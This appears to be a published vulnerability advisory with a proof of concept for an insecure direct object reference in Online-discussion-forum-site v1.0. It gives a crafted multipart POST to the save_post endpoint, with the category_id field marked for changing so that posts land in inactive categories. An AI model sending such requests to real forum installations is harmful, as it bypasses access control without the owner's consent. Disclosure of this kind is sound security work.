# Exploit Title: Online-discussion-forum-site v1.0 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://www.sourcecodester.com/php/15337/online-discussion-forum-site-phpoop-free-source-code.html
## Tested on: Debian Linux, Apache, Mysql
## Vendor: oretnom23
## Version: v1.0
## Exploit Description:
## Online-discussion-forum-site v1.0 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to create post in category that is inactive(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /odfs/classes/Master.php?f=save_post HTTP/1.1
...

------WebKitFormBoundaryKDuEtJHjHqr7AMTC
Content-Disposition: form-data; name="id"


------WebKitFormBoundaryKDuEtJHjHqr7AMTC
Content-Disposition: form-data; name="title"

aaaa
------WebKitFormBoundaryKDuEtJHjHqr7AMTC
Content-Disposition: form-data; name="category_id"

1(CHANGE HERE)
------WebKitFormBoundaryKDuEtJHjHqr7AMTC
Content-Disposition: form-data; name="content"

<p>aaaa</p>
------WebKitFormBoundaryKDuEtJHjHqr7AMTC
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryKDuEtJHjHqr7AMTC--

```